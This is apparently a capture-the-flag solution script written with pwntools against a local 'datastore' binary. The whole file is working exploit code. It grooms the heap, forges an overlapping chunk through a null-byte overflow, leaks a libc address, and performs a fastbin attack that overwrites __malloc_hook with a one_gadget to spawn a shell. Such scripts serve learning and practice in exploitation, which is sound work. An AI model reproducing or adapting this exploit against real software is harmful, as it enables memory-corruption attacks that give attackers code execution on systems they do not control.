#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./datastore"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(cmd):
    p.sendlineafter("PROMPT: Enter command:\n",str(cmd))

def PUT(rowkey,size,data):
    opt("PUT")
    p.sendlineafter("PROMPT: Enter row key:\n",str(rowkey))
    p.sendlineafter("PROMPT: Enter data size:\n",str(size))
    p.sendlineafter("PROMPT: Enter data:\n",str(data))

def GET(rowkey):
    opt("GET")
    p.sendlineafter("PROMPT: Enter row key:\n",str(rowkey))

def DEL(idx):
    opt("DEL")
    p.sendlineafter("PROMPT: Enter row key:\n",str(idx))

def DUMP():
    opt("DUMP")

def EXIT():
    opt("EXIT")


# gdb.attach(p,"tracemalloc on\n")
for i in range(10):
    PUT(str(i),0x38,str(i)*0x38)

for i in range(10):
    DEL(str(i))

PUT("1",0x200,"a"*0x200)
PUT("2",0x50,"b"*0x50)
PUT("3",0x68,"c"*0x68)
PUT("4",0x1f8,"a"*0x1f8)
PUT("5",0xf0,"a"*0xf0)
PUT("6",0x400,"p"*0x400) # 防止DEL(5)时和 top chunk 合并,同时收集合并前面for循环free产生的大量0x20和0x40的fastbin

DEL("3")
DEL("4")
DEL("1")

DEL("a"*0x1f0 + p64(0x4e0))

DEL("5")
PUT("anything1",0x200,"x"*0x200)
PUT("anything2",0x200,"x"*0x200)

# leak libc_base , one_gadget addr
GET("2")
p.recvuntil("INFO: Row data [80 bytes]:\n")
call_back = u64(p.recv(6).ljust(8,"\0"))
offset = 0x3c4b78
libc_base = call_back - offset
one_offset = 0x4527a
one_gadget = libc_base + one_offset
log.success("one_gadget addr is -> "+ hex( one_gadget ))

fake_chunk = 0x7ffff7dd1afd
# fake_chunk = libc_base + libc.sym["__malloc_hook"] - 0x13
payload = flat([
    "A"*0x58,0x71,
    fake_chunk
    ]).ljust(0x100,"\0")
PUT("fake_chunk",0x100,payload)
PUT("padding",0x68,"a".ljust(0x68,"\0"))
payload = flat([
    "a"*0x3,one_gadget,one_gadget,one_gadget
    ]).ljust(0x68)
PUT("attack",0x68,payload)
# gdb.attach(p,"set $hk=0x7ffff7dd1b10")

p.interactive()
